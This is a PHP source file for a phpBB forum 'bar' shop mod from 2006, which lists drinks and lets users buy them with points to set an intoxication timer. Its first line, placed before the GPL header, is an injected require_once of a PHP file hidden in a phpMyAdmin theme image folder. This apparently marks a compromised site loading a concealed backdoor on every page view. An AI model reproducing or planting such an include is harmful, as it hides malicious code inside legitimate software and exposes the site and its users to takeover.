<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                               shop_bar.php
 *                            -------------------
 *   Version              : 1.0.0
 *   Website		  : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   copyright (C) 2006  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//
//
// Start page Variables
//
if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }

if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }
//
// End page variables
//

//start of special shop display
if ( empty($action) )
{
	$template->set_filenames(array(
		'body' => 'shop/shop_bar_body.tpl')
	);

	$sql = "SELECT a.*
		FROM " . SHOP_ITEMS_TABLE . " a, " . SHOP_TABLE . " b
		WHERE b.url = 'shop_bar.php'
			AND a.shop = b.shopname";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting alcohols!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);
	if ( $sql_count )
	{
		for ($i = 0; $i < $sql_count; $i++)
		{
			if (!( $row = $db->sql_fetchrow($result) ))
			{
				message_die(GENERAL_ERROR, "Error getting alcohols!", '', __LINE__, __FILE__, $sql);
			}

			$rownum = ( $i % 2 ) ? "row1" : "row2";

			if ( $row['sdesc'] < 0 )
			{
				$duration = '-' . duration($row['sdesc'] * -1);
			}
			else
			{
				$duration = ( !is_numeric($row['sdesc']) || $row['sdesc'] < 1 ) ? $lang['bar_none'] : duration($row['sdesc']);
			}

			$template->assign_block_vars('list_items', array(
				'ROW_CLASS' => $rownum,
				'ITEM_URL' => append_sid("shop_bar.php?action=buy&item_id=" . $row['id']),
				'ITEM_NAME' => $row['name'],
				'ITEM_DESC' => $row['ldesc'],
				'ITEM_LENGTH' => $duration,
				'ITEM_COST' => $row['cost'],
				'ITEM_STOCK' => $row['stock'])
			);
		}
	}
	else
	{
		$template->assign_block_vars('switch_no_drinks', array());
	}

	if ( ($userdata['user_drunk'] - time()) > 0 )
	{
		$time_left = duration(($userdata['user_drunk'] - time()));

		$template->assign_block_vars('switch_is_drunk', array(
			'L_TIME_LEFT' => sprintf($lang['bar_intox_left'], $time_left)
		));
	}

	$page_title = $row['shop'];
	$title = $lang['bar_available_drinks'];
	$shoplocation = ' -> <a href="' . append_sid("shop_bar.$phpEx") . '" class="nav">' . $page_title . '</a>';


	$template->assign_vars(array(
		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

		'USER_POINTS' => $userdata['user_points'],
		'SHOPLOCATION' => $shoplocation,

		'L_POINTS_NAME' => $board_config['points_name'],
		'L_PERSONAL_INFO' => $lang['your_inv'],
		'L_SHOP_TITLE' => $title,

		'L_DRINK' => $lang['bar_drink_name'],
		'L_DESCRIPTION' => $lang['bar_description'],
		'L_COST' => $lang['item_cost'],
		'L_STOCK' => $lang['item_stock'],
		'L_BUY' => $lang['buy'],
		'L_INTOX_DUR' => $lang['bar_intox_dur'],
		'L_NO_DRINKS' => $lang['bar_empty']
	));
	$template->assign_block_vars('', array());

}

//start of buy & sell specials
elseif ( $action == 'buy' )
{
	if ( isset($HTTP_GET_VARS['item_id']) || isset($HTTP_POST_VARS['item_id']) ) { $item_id = ( isset($HTTP_POST_VARS['item_id']) ) ? intval($HTTP_POST_VARS['item_id']) : intval($HTTP_GET_VARS['item_id']); }
	else { $item_id = ''; }

	if ( !$userdata['session_logged_in'] )
	{
		$redirect = 'shop_bar.'.$phpEx.'&action=buy&item_id=' . $item_id;
		header('Location: ' . append_sid("login.$phpEx?redirect=$redirect", true));
	}

	if ( $item_id < 1 ) { message_die(GENERAL_MESSAGE, $lang['bar_no_drink']); }
	$sql = "SELECT a.*
		FROM " . SHOP_ITEMS_TABLE . " a, " . SHOP_TABLE . " b
		WHERE a.id = '$item_id'
			AND b.url = 'shop_bar.php'
			AND a.shop = b.shopname";

	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting alcohols!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);
	if ( $sql_count )
	{
		if (!( $row = $db->sql_fetchrow($result) ))
		{
			message_die(GENERAL_ERROR, "Error getting alcohols!", '', __LINE__, __FILE__, $sql);
		}

		if ( $row['stock'] < 1 ) { $error = $lang['bar_sold_out'] . '<br />' . sprintf($lang['bar_return'], '<a href="' . append_sid('shop_bar.php') . '" class="nav">', '</a>'); }
		elseif ( $row['cost'] > $userdata['user_points'] ) { $error = sprintf($lang['bar_no_money'], $board_config['points_name']) . '<br />' . sprintf($lang['bar_return'], '<a href="' . append_sid('shop_bar.php') . '" class="nav">', '</a>'); }
		elseif ( ( ($userdata['user_drunk'] - time()) > 7200 ) && ( is_numeric($row['sdesc']) ) ) { $error = $lang['bar_too_drunk'] . '<br />' . sprintf($lang['bar_return'], '<a href="' . append_sid('shop_bar.php') . '" class="nav">', '</a>'); }
		if ( $error ) { message_die(GENERAL_MESSAGE, $error); }

		# Begin main drunk code!
		$sql = "UPDATE " . SHOP_ITEMS_TABLE . "
			SET stock = stock - 1
			WHERE id = '$item_id'";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error updating alcohols!", '', __LINE__, __FILE__, $sql);
		}

		$drunk_time = ( ( $userdata['user_drunk'] > time() ) ? $userdata['user_drunk'] : time() ) + $row['sdesc'];

		$sql = "UPDATE " . USERS_TABLE . "
			SET user_drunk = $drunk_time,
				user_points = user_points - {$row['cost']}
			WHERE user_id = '{$userdata['user_id']}'";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error updating alcohols!", '', __LINE__, __FILE__, $sql);
		}

		# Create current intoxication level...
		if ( ($drunk_time - time()) < 1 ) { $msg = $lang['bar_drunk_1']; }
		elseif ( ($drunk_time - time()) < 600 ) { $msg = $lang['bar_drunk_2']; }
		elseif ( ($drunk_time - time()) < 1500 ) { $msg = $lang['bar_drunk_3']; }
		elseif ( ($drunk_time - time()) < 3000 ) { $msg = $lang['bar_drunk_4']; }
		elseif ( ($drunk_time - time()) > 3000 ) { $msg = $lang['bar_drunk_5']; }

		message_die(GENERAL_MESSAGE, sprintf($lang['bar_buy_drink'], $row['name']) . '<br /><b>' . $msg . '</b><br />' . sprintf($lang['bar_return'], '<a href="' . append_sid('shop_bar.php') . '" class="nav">', '</a>'));
	}
	else
	{
		message_die(GENERAL_MESSAGE, $lang['bar_no_drink']);
	}
}

else 
{
	message_die(GENERAL_MESSAGE, 'This is not a valid command!');
}

//
// Start output of page
//
include($phpbb_root_path . 'includes/page_header.' . $phpEx);

//
// Generate the page
//
$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.' . $phpEx);

?>